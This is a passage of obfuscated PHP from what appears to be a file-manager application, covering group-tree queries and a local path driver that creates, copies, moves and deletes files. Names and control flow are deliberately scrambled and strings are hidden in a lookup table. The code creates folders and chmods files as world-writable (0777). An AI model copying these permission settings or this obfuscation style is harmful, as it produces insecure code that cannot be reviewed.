ëöµ»[371]][$DªÛ ëöµ»[372]] = count($EÖ¤¹»’Ò£[$DªÛ ëöµ»[374]]); goto a¥Œ‚‘ÆÅ; F¨±„ê‡‹‹: } $this->_listDataApply($EÖ¤¹»’Ò£[$DªÛ ëöµ»[374]]); goto AĞ ‚ÃÒ¡®; E·ÏÉä¾Î«: $DªÛ ëöµ» =& $_SERVER[¾÷]; $AÀšâŠÇÂ´ = $eÄìÃ›„š¼[$DªÛ ëöµ»[1752]]; $eÑØŒ‘´íÒ = isset($eÄìÃ›„š¼[$DªÛ ëöµ»[1753]]) ? $eÄìÃ›„š¼[$DªÛ ëöµ»[1753]] : !1; goto E¿ëÓÉï±Ü; A³àñŒÍİ : if ($eÑØŒ‘´íÒ) { $FÖ¿ßÄ„‚ = $this->getInfoSimple($eÑØŒ‘´íÒ); $F–ğß½öÉç = $FÖ¿ßÄ„‚[$DªÛ ëöµ»[490]] . $eÑØŒ‘´íÒ . $DªÛ ëöµ»[517]; $Fà‹ŞÍ±Î = array($Fà‹ŞÍ±Î, array($DªÛ ëöµ»[490] => array($DªÛ ëöµ»[387], $F–ğß½öÉç))); } $Fà‹ŞÍ±Î = $this->parseWhereLike($Fà‹ŞÍ±Î); $EÖ¤¹»’Ò£ = $this->_makeOrder()->where($Fà‹ŞÍ±Î)->selectPage(20); goto Aß‡ƒ›ˆÑá; AĞ ‚ÃÒ¡®: return $EÖ¤¹»’Ò£; goto E¤‚áİÔó; E¤‚áİÔó: } protected function groupChildrenAll($fíºÙ«‰ÏÈ) { $b¹ƒ…ˆí¯³ =& $_SERVER[¾÷]; if (!$fíºÙ«‰ÏÈ) { return !1; } if (is_string($fíºÙ«‰ÏÈ)) { $fíºÙ«‰ÏÈ = array($fíºÙ«‰ÏÈ); } $f‚ÏÀÕñÍó = $fíºÙ«‰ÏÈ; foreach ($fíºÙ«‰ÏÈ as $d›­‘–²¤Ï) { $aˆ·–¼¶ˆ = $this->getInfoSimple($d›­‘–²¤Ï); $FÍÂğÆË = array($b¹ƒ…ˆí¯³[490] => array($b¹ƒ…ˆí¯³[387], $aˆ·–¼¶ˆ[$b¹ƒ…ˆí¯³[490]] . $d›­‘–²¤Ï . $b¹ƒ…ˆí¯³[517])); $BŞŞÑ‘Ò”æ = $this->field($b¹ƒ…ˆí¯³[1668])->where($FÍÂğÆË)->select(); $f‚ÏÀÕñÍó = array_merge($f‚ÏÀÕñÍó, array_to_keyvalue($BŞŞÑ‘Ò”æ, $b¹ƒ…ˆí¯³[43], $b¹ƒ…ˆí¯³[1668])); } return array_unique($f‚ÏÀÕñÍó); } private function _searchFromMeta($CÛ³Öà ¦Ù, $dÅËÌò‘Ãó, $fÌ–—‹Ûã›, $C²ÃŠªÑŞ¶) { goto CÚ‘îŒ¥‡Ä; CÚ‘îŒ¥‡Ä: $c³Òƒë¤Ş =& $_SERVER[¾÷]; $dÅËÌò‘Ãó = strtolower($dÅËÌò‘Ãó); $BŒ¬¥¦³á¦ = array($c³Òƒë¤Ş[102] => $CÛ³Öà ¦Ù, $c³Òƒë¤Ş[379] => array($c³Òƒë¤Ş[387], "\45{$dÅËÌò‘Ãó}\x25")); goto eÈÂ²Íëš; eÈÂ²Íëš: $BŒ¬¥¦³á¦ = $this->parseWhereLike($BŒ¬¥¦³á¦); if ($C²ÃŠªÑŞ¶) { $BŒ¬¥¦³á¦[$c³Òƒë¤Ş[1668]] = array($c³Òƒë¤Ş[17], $C²ÃŠªÑŞ¶); } $E£¸¡Ù’ÏÃ = Model($c³Òƒë¤Ş[1757])->where($BŒ¬¥¦³á¦)->limit($fÌ–—‹Ûã›)->select(); goto bàŒÈÊø°; bàŒÈÊø°: if (!$E£¸¡Ù’ÏÃ) { return array(); } $E£¸¡Ù’ÏÃ = array_to_keyvalue($E£¸¡Ù’ÏÃ, $c³Òƒë¤Ş[43], $c³Òƒë¤Ş[1668]); $eÃ‡·å¥† = $this->where(array($c³Òƒë¤Ş[1747] => array($c³Òƒë¤Ş[17], $E£¸¡Ù’ÏÃ)))->select(); goto a—ˆæÕÅ»; a—ˆæÕÅ»: if (!$eÃ‡·å¥†) { return array(); } return $eÃ‡·å¥†; goto DÆãö·Êºƒ; DÆãö·Êºƒ: } protected function _listDataApplyItem($Dô†øëƒÏ) { $b‘¼„ØŒ„Æ = array($Dô†øëƒÏ); $this->_listDataApply($b‘¼„ØŒ„Æ); return $b‘¼„ØŒ„Æ[0]; } protected function _listDataApply(&$EÒ¥Ûº±ñŸ) { goto c‹¸ «Íå; E¹¹›óé—: $this->_listAppendChildren($EÒ¥Ûº±ñŸ); $this->_listAppendChildrenMember($EÒ¥Ûº±ñŸ); $this->_listAppendMeta($EÒ¥Ûº±ñŸ, $aôéŠèÃÁĞ); goto b«¢ÃÉàÊÜ; b«¢ÃÉàÊÜ: $this->_listAppendParent($EÒ¥Ûº±ñŸ); $this->_listAppendSourceRoot($EÒ¥Ûº±ñŸ, $aôéŠèÃÁĞ); goto bŒ“Áìì¤Ø; c‹¸ «Íå: $a´‹·¬‹· =& $_SERVER[¾÷]; if (!$EÒ¥Ûº±ñŸ) { return; } $aôéŠèÃÁĞ = array_to_keyvalue($EÒ¥Ûº±ñŸ, $a´‹·¬‹·[43], $a´‹·¬‹·[1668]); goto E¹¹›óé—; bŒ“Áìì¤Ø: } private function _listAppendChildren(&$B…–Å³“¦À) { goto eÜ•Ú»ÜŸ; eÜ•Ú»ÜŸ: $cµÔ¾æ«Ò˜ =& $_SERVER[¾÷]; $CÍ£¯“Ğ = array_to_keyvalue($B…–Å³“¦À, $cµÔ¾æ«Ò˜[43], $cµÔ¾æ«Ò˜[1668]); $E’‰™ğ´ = array($cµÔ¾æ«Ò˜[481] => array($cµÔ¾æ«Ò˜[17], $CÍ£¯“Ğ)); goto AÕïîÕ‰²á; bî½ïª»îÚ: foreach ($B…–Å³“¦À as &$CâÍ¦¯Ø¹ì) { $E¤Ë›¬ï’÷ = $CâÍ¦¯Ø¹ì[$cµÔ¾æ«Ò˜[1668]]; $CâÍ¦¯Ø¹ì[$cµÔ¾æ«Ò˜[1759]] = isset($dÍ¼„ ‹§²[$E¤Ë›¬ï’÷]) ? intval($dÍ¼„ ‹§²[$E¤Ë›¬ï’÷]) : !1; } unset($CâÍ¦¯Ø¹ì); goto BôÂ»µŞ‡; AÕïîÕ‰²á: $dŒ«‘Óó¾É = array($cµÔ¾æ«Ò˜[481], $cµÔ¾æ«Ò˜[1758] => $cµÔ¾æ«Ò˜[483]); $EŞÑï¿È› = $this->field($dŒ«‘Óó¾É)->where($E’‰™ğ´)->group($cµÔ¾æ«Ò˜[481])->select(); $dÍ¼„ ‹§² = array_to_keyvalue($EŞÑï¿È›, $cµÔ¾æ«Ò˜[481], $cµÔ¾æ«Ò˜[483]); goto bî½ïª»îÚ; BôÂ»µŞ‡: } private function _listAppendChildrenMember(&$aÈéæ’Áë¡) { goto e§…ÅŞ¹Ì; EàèÖ÷Ó±ì: foreach ($aÈéæ’Áë¡ as &$a±ì¤ñÇæ·) { $f¬Š‚…½¬­ = $a±ì¤ñÇæ·[$a–öæ™¡Ä’[1668]]; $a±ì¤ñÇæ·[$a–öæ™¡Ä’[1760]] = isset($bîñïêÚï[$f¬Š‚…½¬­]) ? intval($bîñïêÚï[$f¬Š‚…½¬­]) : !1; } unset($a±ì¤ñÇæ·); goto BîˆÀÎêàÅ; a„ˆ¼Ú¡ÄÙ: $e‹£ùòƒö£ = array($a–öæ™¡Ä’[1668], $a–öæ™¡Ä’[1758] => $a–öæ™¡Ä’[483]); $cªë„å¶ç´ = Model($a–öæ™¡Ä’[1750])->field($e‹£ùòƒö£)->where($f”îâ‚»Ã)->group($a–öæ™¡Ä’[1668])->select(); $bîñïêÚï = array_to_keyvalue($cªë„å¶ç´, $a–öæ™¡Ä’[1668], $a–öæ™¡Ä’[483]); goto EàèÖ÷Ó±ì; e§…ÅŞ¹Ì: $a–öæ™¡Ä’ =& $_SERVER[¾÷]; $DÏ©™«ì§ = array_to_keyvalue($aÈéæ’Áë¡, $a–öæ™¡Ä’[43], $a–öæ™¡Ä’[1668]); $f”îâ‚»Ã = array($a–öæ™¡Ä’[1668] => array($a–öæ™¡Ä’[17], $DÏ©™«ì§)); goto a„ˆ¼Ú¡ÄÙ; BîˆÀÎêàÅ: } private function _listAppendMeta(&$Aƒ³ÜÑ¨¤Î, $dõ”»¢äèŞ) { goto f”Í‘ÖŸĞÙ; e‹è—µ”Î: foreach ($Aƒ³ÜÑ¨¤Î as &$aï…ÁİÜì–) { $aï…ÁİÜì–[$AæµØ—¿Š[448]] = array(); if (isset($B¡ïí½æ[$aï…ÁİÜì–[$AæµØ—¿Š[1668]]])) { $aï…ÁİÜì–[$AæµØ—¿Š[448]] = $B¡ïí½æ[$aï…ÁİÜì–[$AæµØ—¿Š[1668]]]; } } unset($aï…ÁİÜì–); goto C¤ŠÅñÇ™Ï; d°ø‡‘òõé: $B¡ïí½æ = array_to_keyvalue_group($B¡ïí½æ, $AæµØ—¿Š[1668]); foreach ($B¡ïí½æ as &$Dä½È¹« Á) { $Dä½È¹« Á = array_to_keyvalue($Dä½È¹« Á, $AæµØ—¿Š[102], $AæµØ—¿Š[379]); } unset($Dä½È¹« Á); goto e‹è—µ”Î; f”Í‘ÖŸĞÙ: $AæµØ—¿Š =& $_SERVER[¾÷]; $e¨¡¹Ş„Ä = array($AæµØ—¿Š[1668] => array($AæµØ—¿Š[17], $dõ”»¢äèŞ)); $B¡ïí½æ = Model($AæµØ—¿Š[1749])->where($e¨¡¹Ş„Ä)->select(); goto d°ø‡‘òõé; C¤ŠÅñÇ™Ï: } protected function parentLevelArray($Cê¹Ü¶¨‚–) { $A–ãÙõ‘Ö =& $_SERVER[¾÷]; $Cê¹Ü¶¨‚– = explode($A–ãÙõ‘Ö[57], trim($Cê¹Ü¶¨‚–, $A–ãÙõ‘Ö[57])); $Cê¹Ü¶¨‚– = array_remove_value($Cê¹Ü¶¨‚–, $A–ãÙõ‘Ö[500]); return $Cê¹Ü¶¨‚–; } private function _listAppendParent(&$DÛô§äñÊ) { goto E¤òã´ …é; dØ‚÷ôİÌà: if ($GLOBALS[$cßğ¦±ÎÜ’[488]] == $cßğ¦±ÎÜ’[96]) { $a¢Í“¾¤¡Ò = !1; } foreach ($DÛô§äñÊ as &$f Ì–çãî) { $d¦§ÌïõÉ÷ = $this->parentLevelArray($f Ì–çãî[$cßğ¦±ÎÜ’[490]]); $B“ÍÙÑ”¤è = $cßğ¦±ÎÜ’[43]; foreach ($d¦§ÌïõÉ÷ as $f‰´»¸ÍŒ => $c±í©ìÇĞ±) { if ($a¢Í“¾¤¡Ò && $f‰´»¸ÍŒ == 0) { continue; } $B“ÍÙÑ”¤è .= $EÉµó§¤È[$c±í©ìÇĞ±] . $cßğ¦±ÎÜ’[18]; } if ($d¦§ÌïõÉ÷) { $B“ÍÙÑ”¤è .= $f Ì–çãî[$cßğ¦±ÎÜ’[38]]; } $f Ì–çãî[$cßğ¦±ÎÜ’[494]] = str_replace($cßğ¦±ÎÜ’[499], $cßğ¦±ÎÜ’[18], $B“ÍÙÑ”¤è); } unset($f Ì–çãî); goto b‹êª°†°; eï¹µ”Ş‘½: unset($f Ì–çãî); foreach ($EÉµó§¤È as $f‰´»¸ÍŒ => $fÚê±˜¼¬¨) { if ($fÚê±˜¼¬¨) { continue; } $B¦Å˜ñçº = $this->getInfoSimple($f‰´»¸ÍŒ); $EÉµó§¤È[$f‰´»¸ÍŒ] = $B¦Å˜ñçº[$cßğ¦±ÎÜ’[38]]; } $a¢Í“¾¤¡Ò = $GLOBALS[$cßğ¦±ÎÜ’[16]][$cßğ¦±ÎÜ’[97]][$cßğ¦±ÎÜ’[1761]]; goto dØ‚÷ôİÌà; E¤òã´ …é: $cßğ¦±ÎÜ’ =& $_SERVER[¾÷]; $EÉµó§¤È = array(); foreach ($DÛô§äñÊ as &$f Ì–çãî) { $EÉµó§¤È[$f Ì–çãî[$cßğ¦±ÎÜ’[1668]]] = $f Ì–çãî[$cßğ¦±ÎÜ’[38]]; $d¦§ÌïõÉ÷ = $this->parentLevelArray($f Ì–çãî[$cßğ¦±ÎÜ’[490]]); foreach ($d¦§ÌïõÉ÷ as $c±í©ìÇĞ±) { if (!isset($EÉµó§¤È[$c±í©ìÇĞ±])) { $EÉµó§¤È[$c±í©ìÇĞ±] = 0; } } } goto eï¹µ”Ş‘½; b‹êª°†°: } private function _listAppendSourceRoot(&$E…í´ä¶¢¡, $FŞæ„†´ê) { goto cˆã° ‡Ì; a„ø÷®­²: foreach ($E…í´ä¶¢¡ as &$cÙŒÂÜÕÓ™) { $cÙŒÂÜÕÓ™[$F°ôˆ¯Çò[94]] = $DµË³›µ[$cÙŒÂÜÕÓ™[$F°ôˆ¯Çò[1668]]] ? $DµË³›µ[$cÙŒÂÜÕÓ™[$F°ôˆ¯Çò[1668]]] : array(); } unset($cÙŒÂÜÕÓ™); goto eíïÌïêŞ; cˆã° ‡Ì: $F°ôˆ¯Çò =& $_SERVER[¾÷]; $Dƒ›ù¬ãĞ = array($F°ôˆ¯Çò[407] => SourceModel::TYPE_GROUP, $F°ôˆ¯Çò[481] => 0, $F°ôˆ¯Çò[487] => array($F°ôˆ¯Çò[17], $FŞæ„†´ê)); $Aé÷’Ñ¢÷Ë = $F°ôˆ¯Çò[1762]; goto C³Å–ÔÎ; C³Å–ÔÎ: $DµË³›µ = Model($F°ôˆ¯Çò[776])->order($F°ôˆ¯Çò[1763])->field($Aé÷’Ñ¢÷Ë)->where($Dƒ›ù¬ãĞ)->select(); $DµË³›µ = array_to_keyvalue($DµË³›µ, $F°ôˆ¯Çò[487]); $DµË³›µ = array_remove_key($DµË³›µ, $F°ôˆ¯Çò[487]); goto a„ø÷®­²; eíïÌïêŞ: } protected function groupMerge($B›©ÄµÏáî) { $B›©ÄµÏáî = array_values(array_unique($B›©ÄµÏáî)); $c‘Ôğ³Ô¯õ = array(); for ($F«ñ’”ƒ¾ = 0; $F«ñ’”ƒ¾ < count($B›©ÄµÏáî); $F«ñ’”ƒ¾++) { $F’ÒÔ™Õ¯İ = !1; for ($fÍ«¨©ô•Ñ = 0; $fÍ«¨©ô•Ñ < count($B›©ÄµÏáî); $fÍ«¨©ô•Ñ++) { if ($F«ñ’”ƒ¾ == $fÍ«¨©ô•Ñ) { continue; } if ($this->isParentOf($B›©ÄµÏáî[$fÍ«¨©ô•Ñ], $B›©ÄµÏáî[$F«ñ’”ƒ¾])) { $F’ÒÔ™Õ¯İ = !0; break; } } if (!$F’ÒÔ™Õ¯İ) { $c‘Ôğ³Ô¯õ[] = $B›©ÄµÏáî[$F«ñ’”ƒ¾]; } } return $c‘Ôğ³Ô¯õ; } protected function isParentOf($aä§’Àˆ¡ë, $eŠÌ®İãï‹) { goto cÏÁíÇëí; Aêáå©Ï‘ë: $aŠ¡·«ã¡’ = $this->getInfoSimple($eŠÌ®İãï‹); $c¤Á³‚“Æœ = $aÜçéôœù‡[$C”ÆŞÉõƒé[490]] . $aä§’Àˆ¡ë . $C”ÆŞÉõƒé[57]; if (substr($aŠ¡·«ã¡’[$C”ÆŞÉõƒé[490]], 0, strlen($c¤Á³‚“Æœ)) == $c¤Á³‚“Æœ) { return !0; } goto CŒ†èßæè; cÏÁíÇëí: $C”ÆŞÉõƒé =& $_SERVER[¾÷]; if (!$aä§’Àˆ¡ë || !$eŠÌ®İãï‹ || $aä§’Àˆ¡ë == $eŠÌ®İãï‹) { return !1; } $aÜçéôœù‡ = $this->getInfoSimple($aä§’Àˆ¡ë); goto Aêáå©Ï‘ë; CŒ†èßæè: return !1; goto d›•ù»¦¥ã; d›•ù»¦¥ã: } public function groupShowRoot($dó…Òõ’Í¯, $e—á®ÂØ‚¬ = false) { goto a‚¬–ºÂÀ½; CÏ¬İ˜ïø¿: if ($e—á®ÂØ‚¬ && count($Aä—¿„ïÀº) == 1) { return $f™®½¨º¸Š; } if (!$F§éãËä´¨[$e¼ä›¾à˜ä[448]] || !isset($F§éãËä´¨[$e¼ä›¾à˜ä[448]][$e¼ä›¾à˜ä[1745]]) || $F§éãËä´¨[$e¼ä›¾à˜ä[448]][$e¼ä›¾à˜ä[1745]] == $e¼ä›¾à˜ä[1719]) { return $this->groupShowRoot($Aä—¿„ïÀº[count($Aä—¿„ïÀº) - 1], $e—á®ÂØ‚¬); } if ($F§éãËä´¨[$e¼ä›¾à˜ä[448]][$e¼ä›¾à˜ä[1745]] == $e¼ä›¾à˜ä[364]) { $DÈÕ¡ä„² = explode($e¼ä›¾à˜ä[57], $F§éãËä´¨[$e¼ä›¾à˜ä[448]][$e¼ä›¾à˜ä[1746]]); if ($DÈÕ¡ä„²) { $f™®½¨º¸Š = array_merge($f™®½¨º¸Š, $DÈÕ¡ä„²); } } goto A¨ÑÅ‡®‹; A¨ÑÅ‡®‹: return $f™®½¨º¸Š; goto cøİ‰Ûæµ; a‚¬–ºÂÀ½: $e¼ä›¾à˜ä =& $_SERVER[¾÷]; $F§éãËä´¨ = $this->getInfo($dó…Òõ’Í¯); if (!$F§éãËä´¨) { return array(); } goto Ešö¬…Ìº; Ešö¬…Ìº: $Aä—¿„ïÀº = $this->parentLevelArray($F§éãËä´¨[$e¼ä›¾à˜ä[490]]); $f™®½¨º¸Š = array($dó…Òõ’Í¯); if (count($Aä—¿„ïÀº) == 0) { return $f™®½¨º¸Š; } goto CÏ¬İ˜ïø¿; cøİ‰Ûæµ: } protected function resetParentLevel() { $d¡‹òØïÉ¹ =& $_SERVER[¾÷]; $FÒº¬Ëõµ™ = $d¡‹òØïÉ¹[1668]; $e†™Æàè«ì = $this->select(); $e†™Æàè«ì = array_to_keyvalue($e†™Æàè«ì, $FÒº¬Ëõµ™); foreach ($e†™Æàè«ì as $cÄ³¬‰ŒÂ¢) { goto b‹‚¦ôÅ—; b‹‚¦ôÅ—: $F¹‰İ…¤‡ = $cÄ³¬‰ŒÂ¢; $c›Ãô‚Óï = array(); while ($F¹‰İ…¤‡[$d¡‹òØïÉ¹[481]] != 0) { $c›Ãô‚Óï[] = $F¹‰İ…¤‡[$d¡‹òØïÉ¹[481]]; $F¹‰İ…¤‡ = $e†™Æàè«ì[$F¹‰İ…¤‡[$d¡‹òØïÉ¹[481]]]; } goto fÖôÔî—–‚; fÖôÔî—–‚: $c›Ãô‚Óï[] = 0; $c›Ãô‚Óï = $d¡‹òØïÉ¹[57] . implode($d¡‹òØïÉ¹[57], array_reverse($c›Ãô‚Óï)) . $d¡‹òØïÉ¹[57]; $this->setNamePinyin($cÄ³¬‰ŒÂ¢[$FÒº¬Ëõµ™], $cÄ³¬‰ŒÂ¢[$d¡‹òØïÉ¹[38]]); goto EŒÒ±‚ƒ˜; EŒÒ±‚ƒ˜: $this->where(array($FÒº¬Ëõµ™ => $cÄ³¬‰ŒÂ¢[$FÒº¬Ëõµ™]))->save(array($d¡‹òØïÉ¹[557] => $c›Ãô‚Óï)); goto dó˜´Ó‡ËÕ; dó˜´Ó‡ËÕ: } return $e†™Æàè«ì; } public function groupNameAuto($A·‡¬ßÌĞÊ, $FÌ»æé²¥¥) { $E±¾È¯İâ =& $_SERVER[¾÷]; $d³Ê‚×ë¯ = $this->where(array($E±¾È¯İâ[398] => $A·‡¬ßÌĞÊ))->getField($E±¾È¯İâ[38], !0); if (!$d³Ê‚×ë¯ || !in_array($FÌ»æé²¥¥, $d³Ê‚×ë¯)) { return $FÌ»æé²¥¥; } for ($EÌ«¼‚·¥„ = 1; $EÌ«¼‚·¥„ <= count($d³Ê‚×ë¯) + 1; $EÌ«¼‚·¥„++) { $e®İ¤±ÄÄ = $FÌ»æé²¥¥ . "\50{$EÌ«¼‚·¥„}\x29"; if (!in_array($e®İ¤±ÄÄ, $d³Ê‚×ë¯)) { return $e®İ¤±ÄÄ; } } } public function groupSwitch($B‰—Ã«ºõÈ, $Cëğ¶²‰ñ‡) { goto Aˆ×ù¦Óƒ; CØÍÑ‚²íÀ: $AŸªçƒŸÒ = array_to_keyvalue($AŸªçƒŸÒ, $eÀà›Ûòˆ¥[1668]); if (!isset($AŸªçƒŸÒ[$B‰—Ã«ºõÈ]) || !isset($AŸªçƒŸÒ[$Cëğ¶²‰ñ‡]) || $AŸªçƒŸÒ[$B‰—Ã«ºõÈ][$eÀà›Ûòˆ¥[481]] == 0) { return !1; } $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[1668] => $B‰—Ã«ºõÈ); goto eÏğ»š²¹; eÏğ»š²¹: $f¹Íï¶âµ× = Model($eÀà›Ûòˆ¥[1750])->where($a’†± ÃÙ†)->select(); if (!$f¹Íï¶âµ×) { $f¹Íï¶âµ× = array(); } foreach ($f¹Íï¶âµ× as $f‰” †õé) { $eˆŠÅ¥Øƒ” = $f‰” †õé[$eÀà›Ûòˆ¥[1505]]; $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[1505] => $eˆŠÅ¥Øƒ”, $eÀà›Ûòˆ¥[1668] => $Cëğ¶²‰ñ‡); $E•É¹œ¾À = Model($eÀà›Ûòˆ¥[1750])->where($a’†± ÃÙ†)->find(); if (!$E•É¹œ¾À) { $aÃ˜ÌŠ™‰ = array($Cëğ¶²‰ñ‡ => $f‰” †õé[$eÀà›Ûòˆ¥[1764]]); Model($eÀà›Ûòˆ¥[510])->userGroupAdd($eˆŠÅ¥Øƒ”, $aÃ˜ÌŠ™‰); } Model($eÀà›Ûòˆ¥[510])->userGroupRemove($eˆŠÅ¥Øƒ”, $B‰—Ã«ºõÈ); } goto B¶¿ñ„”ç™; FÖ“®òŞ±: $this->where(array($eÀà›Ûòˆ¥[481] => $B‰—Ã«ºõÈ))->save(array($eÀà›Ûòˆ¥[481] => $Cëğ¶²‰ñ‡)); return !0; goto D—Œ‹Ó†›æ; B¶¿ñ„”ç™: $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[407] => 2, $eÀà›Ûòˆ¥[481] => 0, $eÀà›Ûòˆ¥[406] => 1, $eÀà›Ûòˆ¥[487] => array($eÀà›Ûòˆ¥[17], array($B‰—Ã«ºõÈ, $Cëğ¶²‰ñ‡))); $F‹œ»øÛ˜á = Model($eÀà›Ûòˆ¥[776])->where($a’†± ÃÙ†)->field($eÀà›Ûòˆ¥[1765])->select(); $F‹œ»øÛ˜á = array_to_keyvalue($F‹œ»øÛ˜á, $eÀà›Ûòˆ¥[487], $eÀà›Ûòˆ¥[399]); goto BéÎöŠÇ¦; Aˆ×ù¦Óƒ: $eÀà›Ûòˆ¥ =& $_SERVER[¾÷]; $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[1668] => array($eÀà›Ûòˆ¥[17], array($B‰—Ã«ºõÈ, $Cëğ¶²‰ñ‡))); $AŸªçƒŸÒ = $this->where($a’†± ÃÙ†)->select(); goto CØÍÑ‚²íÀ; BéÎöŠÇ¦: $F±Ãë¥ğ‘ = !empty($F‹œ»øÛ˜á[$B‰—Ã«ºõÈ]) ? $F‹œ»øÛ˜á[$B‰—Ã«ºõÈ] : !1; if ($F±Ãë¥ğ‘) { goto a±×ïµéµ; Eãº ì”£‡: $F‹œ»øÛ˜á = Model($eÀà›Ûòˆ¥[776])->where($a’†± ÃÙ†)->field($eÀà›Ûòˆ¥[1766])->select(); if (!$F‹œ»øÛ˜á) { $F‹œ»øÛ˜á = array(); } Model($eÀà›Ûòˆ¥[776])->moveClearAuth = !1; goto d¼Â¡‚Å; aò…ëøòÅ: $C‚Š‹µ×º = array($eÀà›Ûòˆ¥[487] => $Cëğ¶²‰ñ‡); Model($eÀà›Ûòˆ¥[1767])->where($a’†± ÃÙ†)->save($C‚Š‹µ×º); Model($eÀà›Ûòˆ¥[1768])->where($a’†± ÃÙ†)->save($C‚Š‹µ×º); goto c†ê©ÎÑ¦ğ; a±×ïµéµ: if (!$F‹œ»øÛ˜á[$Cëğ¶²‰ñ‡]) { $F‹œ»øÛ˜á[$Cëğ¶²‰ñ‡] = Model($eÀà›Ûòˆ¥[776])->groupRootAdd($Cëğ¶²‰ñ‡); } $a’æìÚš½ = $F‹œ»øÛ˜á[$Cëğ¶²‰ñ‡]; $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[481] => $F±Ãë¥ğ‘); goto Eãº ì”£‡; d¼Â¡‚Å: foreach ($F‹œ»øÛ˜á as $f·÷×¯³ƒƒ) { $AÜ›ò´Ù® = $f·÷×¯³ƒƒ[$eÀà›Ûòˆ¥[406]] == $eÀà›Ûòˆ¥[96] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($eÀà›Ûòˆ¥[776])->move($f·÷×¯³ƒƒ[$eÀà›Ûòˆ¥[399]], $a’æìÚš½, $AÜ›ò´Ù®); } Model($eÀà›Ûòˆ¥[776])->moveClearAuth = !0; $a’†± ÃÙ† = array($eÀà›Ûòˆ¥[407] => 2, $eÀà›Ûòˆ¥[487] => $B‰—Ã«ºõÈ); goto aò…ëøòÅ; c†ê©ÎÑ¦ğ: } $this->_changeChildLevel($AŸªçƒŸÒ[$B‰—Ã«ºõÈ], $AŸªçƒŸÒ[$Cëğ¶²‰ñ‡], !0); goto FÖ“®òŞ±; D—Œ‹Ó†›æ: } } goto FÉù¥ø±ºŞ; E—©´¹áÆĞ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($dã¯Ò¥•êÒ) { if (substr($dã¯Ò¥•êÒ, 0, 2) == $_SERVER[¾÷][1220]) { $dã¯Ò¥•êÒ = BASIC_PATH . substr($dã¯Ò¥•êÒ, 2); } return $dã¯Ò¥•êÒ; } public function iconvApp($b–ªÄƒ¨³) { $b¤ÑÂí·Ü› =& $_SERVER[¾÷]; global $config; return $this->iconvTo($b–ªÄƒ¨³, $config[$b¤ÑÂí·Ü›[1218]], $config[$b¤ÑÂí·Ü›[1217]]); } public function iconvSystem($f²È†‘÷Ö) { $d¤±Ë—¾êà =& $_SERVER[¾÷]; global $config; return $this->iconvTo($f²È†‘÷Ö, $config[$d¤±Ë—¾êà[1217]], $config[$d¤±Ë—¾êà[1218]]); } public function getPathOuter($e·í†§‹ÚÁ) { goto fµ –½Ş‡²; d–Ğéœèø”: $e·í†§‹ÚÁ = KodIO::clear($e·í†§‹ÚÁ); $e·í†§‹ÚÁ = substr($e·í†§‹ÚÁ, strlen($Cá±ÑŸø¤‰)); if (empty($this->pathDriver)) { return $e·í†§‹ÚÁ; } goto c½Õ’Äƒ; c½Õ’Äƒ: return $this->pathDriver . $dĞ‘šÆÇ‹[18] . ltrim($e·í†§‹ÚÁ, $dĞ‘šÆÇ‹[18]); goto cä¿øÉáÆ; A¹Ä‡â¶Ôº: if (substr($Cá±ÑŸø¤‰, 0, 2) == $dĞ‘šÆÇ‹[1220]) { $Cá±ÑŸø¤‰ = BASIC_PATH . substr($Cá±ÑŸø¤‰, 2); } if (substr($e·í†§‹ÚÁ, 0, 2) == $dĞ‘šÆÇ‹[1220]) { $e·í†§‹ÚÁ = BASIC_PATH . substr($e·í†§‹ÚÁ, 2); } $Cá±ÑŸø¤‰ = KodIO::clear($Cá±ÑŸø¤‰); goto d–Ğéœèø”; fµ –½Ş‡²: $dĞ‘šÆÇ‹ =& $_SERVER[¾÷]; $Cá±ÑŸø¤‰ = $this->iconvApp($this->pathBase); $e·í†§‹ÚÁ = $this->iconvApp($e·í†§‹ÚÁ); goto A¹Ä‡â¶Ôº; cä¿øÉáÆ: } public function mkfile($e˜ºĞ¹¹Â¥, $bø¼Ü‰„ìÓ = '', $DŠ“‹×ñ¾Ê = REPEAT_RENAME) { $e˜ºĞ¹¹Â¥ = $this->iconvSystem($e˜ºĞ¹¹Â¥); @touch($e˜ºĞ¹¹Â¥); if ($bø¼Ü‰„ìÓ) { file_put_contents($e˜ºĞ¹¹Â¥, $bø¼Ü‰„ìÓ); } return is_file($e˜ºĞ¹¹Â¥) ? $this->getPathOuter($e˜ºĞ¹¹Â¥) : !1; } public function mkdir($EœµáñîÅä, $d…Ã‹É†Îî = REPEAT_SKIP) { $EœµáñîÅä = $this->iconvSystem($EœµáñîÅä); if (is_dir($EœµáñîÅä)) { return $this->getPathOuter($EœµáñîÅä); } @mkdir($EœµáñîÅä, 511, !0); return is_dir($EœµáñîÅä) ? $this->getPathOuter($EœµáñîÅä) : !1; } public function copyFile($f‚ŸéƒŞÑå, $c¶£ÓòÖ) { $this->mkdir($this->pathFather($c¶£ÓòÖ)); $f‚ŸéƒŞÑå = $this->iconvSystem($f‚ŸéƒŞÑå); $c¶£ÓòÖ = $this->iconvSystem($c¶£ÓòÖ); $d—÷‘³ëÏö = copy_64($f‚ŸéƒŞÑå, $c¶£ÓòÖ); return $d—÷‘³ëÏö ? $this->getPathOuter($c¶£ÓòÖ) : !1; } public function moveFile($AÚ‹Ç¤óÂ’, $aØÌÇ¬èŠÖ) { $this->mkdir($this->pathFather($aØÌÇ¬èŠÖ)); $AÚ‹Ç¤óÂ’ = $this->iconvSystem($AÚ‹Ç¤óÂ’); $aØÌÇ¬èŠÖ = $this->iconvSystem($aØÌÇ¬èŠÖ); $A‹•°æ½ÊÖ = intval(@rename($AÚ‹Ç¤óÂ’, $aØÌÇ¬èŠÖ)); if (!$A‹•°æ½ÊÖ) { if ($A‹•°æ½ÊÖ = intval(@copy_64($AÚ‹Ç¤óÂ’, $aØÌÇ¬èŠÖ))) { @unlink($AÚ‹Ç¤óÂ’); } } return $A‹•°æ½ÊÖ ? $this->getPathOuter($aØÌÇ¬èŠÖ) : !1; } public function delFile($fãºÅ¸Ï º) { $fãºÅ¸Ï º = $this->iconvSystem($fãºÅ¸Ï º); if (!@unlink($fãºÅ¸Ï º)) { @chmod($fãºÅ¸Ï º, 511); if (!@unlink($fãºÅ¸Ï º)) { return !1; } } else { return !0; } } public function 